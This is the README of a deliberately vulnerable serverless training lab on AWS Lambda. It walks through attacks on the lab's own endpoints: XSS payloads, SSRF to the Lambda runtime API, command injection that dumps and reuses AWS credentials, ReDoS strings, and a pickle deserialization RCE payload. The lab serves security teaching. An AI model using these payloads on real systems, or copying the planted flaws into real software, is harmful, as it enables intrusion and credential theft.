<h1 align="center">Very Vulnerable Serverless Application</h1>

<p align="center">
  by <a href="https://topmate.io/peachycloudsecurity">Anjali &amp; Divyanshu</a> (theshukladuo) at <a href="https://www.youtube.com/@peachycloudsecurity">Peachycloud Security</a>
</p>

<p align="center">
  <img src="https://topmate.io/cdn-cgi/image/width=640,quality=90/https://static.topmate.io/4butNtHixUQEEyRVd1jbyU.png" width="280" alt="Peachy Cloud Security, by The Shukla Duo" />
</p>

<p align="center">
  <a href="https://peachycloudsecurity.com/training/live-bootcamp#all-trainings"><img alt="Trainings" src="https://img.shields.io/badge/Trainings-f0663d?style=for-the-badge&logo=googleclassroom&logoColor=white" /></a>
  <a href="https://www.youtube.com/@peachycloudsecurity"><img alt="YouTube" src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" /></a>
  <a href="https://instagram.com/peachycloudsecurity"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white" /></a>
  <a href="https://topmate.io/peachycloudsecurity"><img alt="Topmate" src="https://img.shields.io/badge/Topmate-E44332?style=for-the-badge" /></a>
</p>

<p align="center">
  A deliberately vulnerable serverless application for learning AWS Lambda security testing.<br/>
  Maps to the <b>OWASP Serverless Top 10</b>. Deploy with <a href="https://github.com/oss-serverless/osls">OSLS</a> (open-source Serverless Framework — no licensing or dashboard sign-up required).
</p>

> [!WARNING]
> Do not deploy this in a production environment. For training, CTF, and authorized security testing only.

---

## OWASP Serverless Top 10 Coverage

| # | Vulnerability | Endpoint | Status |
|---|--------------|----------|--------|
| SLS-1 | Injection (XSS + Command Injection) | `/welcome/<name>`, `/login`, `/date` | ✅ |
| SLS-2 | Broken Authentication | N/A (hardcoded secret key) | ✅ |
| SLS-3 | Sensitive Data Exposure / SSRF | `/redirect?url=` | ✅ |
| SLS-4 | Insecure Deserialization | `/deserial` | ✅ |
| SLS-5 | Broken Access Control | IAM `s3:*` on `*` | ✅ |
| SLS-6 | Security Misconfiguration | `serverless.yml` (env vars, IAM) | ✅ |
| SLS-7 | Cross-Site Scripting (XSS) | `/welcome/<name>` | ✅ |
| SLS-8 | Insecure Third-Party Components | `requirements.txt` | ✅ |
| SLS-9 | Insufficient Logging & Monitoring | No CloudWatch alarms | ✅ |
| SLS-10 | Event Injection / ReDoS | `/redos?string=` | ✅ |

---

## Endpoints

| Method | Path | Vulnerability |
|--------|------|---------------|
| GET | `/` | Landing page |
| GET | `/welcome/<name>` | Injection / XSS |
| POST, GET | `/login` | Injection |
| GET | `/redirect?url=` | SSRF / Lambda runtime access |
| GET | `/date?exec=` | OS Command Injection |
| GET | `/redos?string=` | ReDoS |
| POST | `/deserial` | Insecure Deserialization (pickle RCE) |

---

## Prerequisites

- **AWS CLI** configured with credentials: `aws configure`
- **Python 3.12+**
- **Node.js 18+**
- **OSLS** (open-source Serverless Framework): `npm install -g osls`

---

## Setup

1. **Clone the repo:**
    ```bash
    git clone https://github.com/peachycloudsecurity/very-vulnerable-serverless
    cd very-vulnerable-serverless
    ```

2. **Install plugin dependencies:**
    ```bash
    npm install
    ```

3. **Deploy to AWS:**
    ```bash
    osls deploy
    ```
    The output prints the API Gateway endpoint URL. Save it — you will need it for every attack below.

    Example output:
    ```
    endpoints:
      ANY - https://xxxxxxxxxx.execute-api.us-east-1.amazonaws.com
    ```

4. **Open the app** in your browser at that URL to confirm it is running.

---

## Attack Walkthroughs

Replace `<endpoint>` with your deployed API Gateway URL in every command below.

---

### 1. Reflected XSS (SLS-1, SLS-7)

The `/welcome/<name>` route reflects user input directly into the response without encoding.

**Steps:**

1. Open your browser and go to:
    ```
    https://<endpoint>/welcome/<script>alert(document.cookie)</script>
    ```
2. The browser executes the script. You should see an alert box with the page cookies.

3. Try an image-based payload that bypasses simple `<script>` filters:
    ```
    https://<endpoint>/welcome/"><img src=x onerror=alert('XSS')>
    ```

**What to look for:** The input appears unescaped in the HTML response body. No output encoding, no Content-Security-Policy header.

---

### 2. Injection via Login Form (SLS-1)

The `/login` endpoint accepts both POST and GET and passes the `name` parameter to `/welcome/<name>` without sanitization.

**Steps:**

1. Submit the form on the landing page with the value:
    ```
    <script>alert('XSS')</script>
    ```
2. Or send it via GET:
    ```bash
    curl -v "https://<endpoint>/login?name=<script>alert('XSS')</script>"
    ```
3. Follow the redirect — the payload is reflected in the `/welcome/` response.

---

### 3. SSRF → Lambda Runtime Credential Theft (SLS-3)

The `/redirect` endpoint fetches any URL the caller supplies using `urllib.request.urlopen`. Inside a Lambda, the runtime API is accessible on `127.0.0.1:9001`.

**Steps:**

1. Confirm SSRF by fetching an external URL:
    ```bash
    curl "https://<endpoint>/redirect?url=https://httpbin.org/ip"
    ```
    You should see the Lambda's public IP in the response.

2. Hit the Lambda runtime API to read the next invocation (which leaks environment context):
    ```bash
    curl "https://<endpoint>/redirect?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"
    ```

3. Combine with command injection (`/date?exec=printenv`) to read `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` from the Lambda environment.

**What to look for:** No allowlist on the URL parameter. Internal services (runtime API, metadata endpoints) are reachable.

---

### 4. OS Command Injection → AWS Credential Theft (SLS-1, SLS-5, SLS-6)

The `/date` endpoint passes the `exec` query parameter directly to `subprocess.Popen` with `shell=True`. The Lambda's IAM role has `s3:*` on `*`.

**Steps:**

1. Run `id` to confirm code execution:
    ```bash
    curl "https://<endpoint>/date?exec=id"
    ```
    Expected: `{"output": "uid=993(sbx_user1051) gid=990 groups=990\n"}`

2. Dump environment variables (AWS credentials live here):
    ```bash
    curl "https://<endpoint>/date?exec=printenv"
    ```
    Look for `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`.

3. Export stolen credentials locally:
    ```bash
    export AWS_ACCESS_KEY_ID=ASIA...
    export AWS_SECRET_ACCESS_KEY=...
    export AWS_SESSION_TOKEN=...
    ```

4. Verify identity and enumerate:
    ```bash
    aws sts get-caller-identity
    aws s3 ls
    ```

5. The role has `s3:*` on `*` — you can list, read, write, and delete any S3 bucket in the account.

**What to look for:** `shell=True` with unsanitized input, overly permissive IAM role (`s3:*` on `Resource: "*"`), credentials in environment variables.

---

### 5. ReDoS — Regular Expression Denial of Service (SLS-10)

The `/redos` endpoint matches user input against the evil regex `^(a+)+b$`, which has catastrophic backtracking on strings of `a` without a trailing `b`.

**Steps:**

1. Normal request (fast):
    ```bash
    curl "https://<endpoint>/redos?string=aaaaaab"
    ```
    Response time should be near `0:00:00`.

2. Attack request — increase the number of `a` characters:
    ```bash
    # ~20 a's — takes a few seconds
    curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaa"

    # ~25 a's — takes much longer
    curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaa"

    # ~30+ a's — Lambda times out (502 Bad Gateway)
    curl "https://<endpoint>/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    ```

3. Compare response times in the HTML output. Each additional `a` roughly doubles the processing time.

**What to look for:** The response time field grows exponentially. Eventually the Lambda hits its timeout and API Gateway returns 502. This is a CPU-exhaustion denial of service with a single HTTP request.

---

### 6. Insecure Deserialization — Pickle RCE (SLS-4)

The `/deserial` endpoint base64-decodes user input and passes it to `pickle.loads()`, which executes arbitrary Python during deserialization.

**Steps:**

1. Create a malicious pickle payload:
    ```python
    import pickle, base64

    class RCE:
        def __reduce__(self):
            import os
            return (os.system, ('touch /tmp/hacked',))

    payload = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
    print(payload)
    ```

2. Send it:
    ```bash
    curl -X POST "https://<endpoint>/deserial" \
      -d "pickled=<base64_payload_from_step_1>"
    ```
    Expected: `pickled successfully`

3. Verify the file was created using command injection:
    ```bash
    curl "https://<endpoint>/date?exec=ls -la /tmp/hacked"
    ```

4. For a reverse shell or data exfil, modify `__reduce__` to run any shell command. Combined with the overly permissive IAM role, this gives full account access.

**What to look for:** `pickle.loads()` on untrusted input is equivalent to `eval()`. Never deserialize data from users.

---

### 7. Security Misconfiguration (SLS-5, SLS-6)

Review `serverless.yml` for misconfigurations without sending a single request.

**What to look for:**

- `VARIABLE_1: supersecret99` — secrets stored as plaintext environment variables (visible in Lambda console, CloudFormation, and `printenv`)
- `s3:*` on `Resource: "*"` — Lambda can access every S3 bucket in the account
- `app.secret_key = 'ThisisSuperFlagBySecurityDojo'` — hardcoded Flask secret in source code
- No CloudWatch alarms, no X-Ray tracing, no WAF — zero monitoring (SLS-9)
- Outdated dependencies in `requirements.txt` with known CVEs (SLS-8)

---

## Cleanup

Remove all deployed AWS resources:

```bash
osls remove
```

This deletes the CloudFormation stack, Lambda function, API Gateway, and associated IAM roles. Verify with:

```bash
aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE \
  | grep very-vulnerable-serverless
```

If no output, the stack is gone.

---

## Related Projects

- [ClientHub Vulnerable SaaS](https://github.com/peachycloudsecurity/clienthub-vulnerable-saas) — Full multi-tenant SaaS app with OWASP Top 10:2017 vulnerabilities, 2FA bypass, S3 misconfig, and more.
- [Container Security Workshop Lab](https://github.com/peachycloudsecurity/container-security-workshop-lab) — Hands-on Docker and container security workshop.

---

## About Us

- **Anjali** is a seasoned cloud security engineer, experienced in DevSecOps and Kubernetes security (EKS/GKE) as well as AWS, Azure, and GCP security. She is the founder of Container Security Village and Kubernetes Village, communities dedicated to enhancing cloud-native security. As the project lead for OWASP EKS Goat, she focuses on AWS EKS security research and hands-on exploitation paths. Anjali is a recognized AWS Community Builder and actively shares her research through her YouTube channel, @peachycloudsecurity. Her extensive speaking history includes Blackhat USA, Black Hat Spring USA, Black Hat Europe, Nullcon, Seasides Goa, BSides Bangalore, CSA Bangalore, and C0c0n. She has also contributed to the community by volunteering at Cloud Village at DEF CON and various BSides events globally. Reach out at peachycloudsecurity[dot]com

- **Divyanshu** is a senior security engineer, experienced in Cloud Security, Kubernetes Security, DevSecOps, Web Application Pentesting, and Threat Modelling. Reported multiple vulnerabilities to companies like Airbnb, Google, Microsoft, AWS, Apple, Amazon, Samsung, Zomato, Xiaomi, Alibaba, Opera, Protonmail, Mobikwik, etc, and received CVE-2019-8727, CVE-2019-16918, CVE-2019-12278, CVE-2019-14962 for reporting issues. Currently co-lead of OWASP EKS Goat, OWASP GKE Goat, Author of Burp-o-mation and very-vulnerable-serverless. Also part of AWS Community Builder for security and Defcon Cloud Village crew member 2020/2021/2022. Delivered talks at events like Blackhat USA, Europe, Seasides, C0c0n, Nullcon, Brucon, BSides Bangalore and BSides Ahmedabad. Also winner of "Cybersecurity Samurai 2023" at BSides Bangalore 2023 & "Cloud Security Champion" at CSA Bangalore 2023. Reach out at peachycloudsecurity[dot]com

---

## Disclaimer

- The information, commands, and demonstrations presented in this lab are intended strictly for educational purposes. Under no circumstances should they be used to compromise or attack any system outside the boundaries of this educational session unless explicit permission has been granted.

    - <b>This course is provided by the instructors independently and is not endorsed by their employers or any other corporate entity. The content does not necessarily reflect the views or policies of any company or professional organization associated with the instructors.</b>

- **Usage of Training Material**: The training material is provided without warranties or guarantees. Participants are responsible for applying the techniques or methods discussed during the training. The trainers and their respective employers or affiliated companies are not liable for any misuse or misapplication of the information provided.

- **Liability**: The trainers, their employers, and any affiliated companies are not responsible for any direct, indirect, incidental, or consequential damages arising from the use of the information provided. No responsibility is assumed for any injury or damage to persons, property, or systems as a result of using or operating any methods, products, instructions, or ideas discussed during the training.

- **Intellectual Property**: This project and all accompanying materials are the intellectual property of the trainers. They are shared under the GPL-3.0 license, which requires that appropriate credit be given to the trainers whenever the materials are used, modified, or redistributed.

- **Educational Purpose**: This lab is for educational purposes only. Do not attack or test any website or network without proper authorization. The trainers are not liable or responsible for any misuse.

- **Usage Rights**: Individuals are permitted to use this project for instructional purposes, provided that no fees are charged to the students.

---

## License

GNU General Public License v3.0 — see [LICENSE](LICENSE).

Credits: [Python-Pickle-RCE-Exploit](https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit)

---

### Contact: **[Peachycloud Security](https://peachycloudsecurity.com)**

## 💝 Support the Project

Your support helps us maintain and improve this project, create more educational content, and continue building open-source security resources for the community.

**Ways to Support:**
- **Subscribe on YouTube** — [youtube.com/@peachycloudsecurity](https://www.youtube.com/@peachycloudsecurity)
- **Sponsor via GitHub** — [GitHub Sponsors](https://github.com/sponsors/peachycloudsecurity)
- **Explore Learning Resources** — Access additional tutorials, walkthroughs, and hands-on labs at [peachycloudsecurity.com](https://peachycloudsecurity.com)
- **Connect & Learn** — Connect with us via [Topmate](https://topmate.io/peachycloudsecurity)

> **Looking for personalized guidance?** Get one-on-one mentorship, interview prep, or custom training sessions through our [Topmate](https://topmate.io/peachycloudsecurity) platform.
